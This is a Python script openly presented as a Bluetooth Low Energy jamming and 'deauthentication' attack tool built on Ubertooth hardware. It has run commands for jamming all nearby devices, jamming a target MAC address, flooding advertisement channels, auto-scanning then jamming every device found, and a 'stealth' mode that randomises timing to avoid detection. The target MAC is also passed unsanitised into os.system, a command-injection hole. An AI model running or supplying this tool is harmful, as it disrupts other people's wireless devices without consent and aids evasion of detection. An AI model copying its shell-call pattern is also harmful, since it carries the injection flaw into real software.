import os
import argparse
import time
import random
import subprocess

"""
BLE Jamming & Deauthentication Attack

Features:
    - Performs BLE deauthentication attacks to force device disconnects.
    - Floods BLE channels with fake advertisements to prevent new connections.
    - Supports targeted jamming against a specific MAC address.
    - Uses Ubertooth One or compatible tools for interference.
    - Implements stealth mode jamming to avoid detection with randomized interference patterns.
    - Adaptive jamming: detects nearby BLE devices before disrupting them.
    - Signal analysis: detects BLE activity levels before executing an attack.

Requirements:
    - Ubertooth One (or compatible SDR)
    - ubertooth-btle and ubertooth-util installed

Run Commands:
    - Jam all BLE devices:
      python ble_jamming_attack.py --jam-all
    - Targeted BLE jamming:
      python ble_jamming_attack.py --target <MAC_ADDRESS> --jam
    - BLE advertisement flooding:
      python ble_jamming_attack.py --flood
    - Stealth mode jamming:
      python ble_jamming_attack.py --stealth
    - Adaptive jamming (scan and jam detected devices):
      python ble_jamming_attack.py --adaptive
    - Signal analysis before attack:
      python ble_jamming_attack.py --signal-analysis
"""

def scan_ble_devices():
    """Scans for nearby BLE devices using Ubertooth and returns a list of detected MAC addresses."""
    print("[INFO] Scanning for nearby BLE devices...")
    result = subprocess.run(["ubertooth-btle", "-s"], capture_output=True, text=True)
    devices = set()
    
    for line in result.stdout.split("\n"):
        if "LE address" in line:
            mac = line.split("LE address: ")[-1].strip()
            devices.add(mac)
    
    print(f"[INFO] Detected BLE devices: {devices}")
    return list(devices)

def analyze_signal():
    """Performs signal analysis before executing an attack to measure BLE activity."""
    print("[INFO] Analyzing BLE signal levels...")
    result = subprocess.run(["ubertooth-btle", "-S"], capture_output=True, text=True)
    print(result.stdout)

def jam_all_ble():
    """Jams all BLE devices by flooding BLE channels."""
    print("[INFO] Starting BLE jamming on all channels...")
    os.system("ubertooth-btle -j")
    print("[INFO] BLE jamming completed.")

def targeted_jamming(target_mac):
    """Targets a specific BLE device for deauthentication."""
    print(f"[INFO] Jamming BLE device: {target_mac}")
    os.system(f"ubertooth-btle -t {target_mac} -j")
    print("[INFO] Targeted BLE jamming completed.")

def ble_advertisement_flooding():
    """Floods BLE advertisement channels to prevent new connections."""
    print("[INFO] Flooding BLE advertisements...")
    os.system("ubertooth-btle -A")
    print("[INFO] BLE advertisement flood completed.")

def stealth_jamming():
    """Performs stealth mode BLE jamming with random delays to avoid detection."""
    print("[INFO] Starting stealth BLE jamming...")
    for _ in range(random.randint(5, 15)):
        os.system("ubertooth-btle -j")
        sleep_time = random.uniform(1.0, 5.0)
        print(f"[INFO] Stealth jamming active, sleeping for {sleep_time:.2f} seconds...")
        time.sleep(sleep_time)
    print("[INFO] Stealth BLE jamming completed.")

def adaptive_jamming():
    """Scans for BLE devices and selectively jams detected devices."""
    detected_devices = scan_ble_devices()
    if not detected_devices:
        print("[INFO] No BLE devices detected for jamming.")
        return
    for device in detected_devices:
        print(f"[INFO] Jamming detected BLE device: {device}")
        os.system(f"ubertooth-btle -t {device} -j")
    print("[INFO] Adaptive BLE jamming completed.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BLE Jamming & Deauthentication Attack")
    parser.add_argument("--jam-all", action="store_true", help="Jam all BLE devices on all channels")
    parser.add_argument("--target", help="MAC address of the BLE device to jam")
    parser.add_argument("--jam", action="store_true", help="Jam a specific BLE device")
    parser.add_argument("--flood", action="store_true", help="Flood BLE advertisement channels")
    parser.add_argument("--stealth", action="store_true", help="Perform stealth BLE jamming with randomized interference patterns")
    parser.add_argument("--adaptive", action="store_true", help="Scan and jam detected BLE devices")
    parser.add_argument("--signal-analysis", action="store_true", help="Analyze BLE signal levels before attack")
    args = parser.parse_args()
    
    if args.jam_all:
        jam_all_ble()
    elif args.jam and args.target:
        targeted_jamming(args.target)
    elif args.flood:
        ble_advertisement_flooding()
    elif args.stealth:
        stealth_jamming()
    elif args.adaptive:
        adaptive_jamming()
    elif args.signal_analysis:
        analyze_signal()
    else:
        print("[ERROR] No valid mode selected! Use --jam-all, --target <MAC> --jam, --flood, --stealth, --adaptive, or --signal-analysis.")
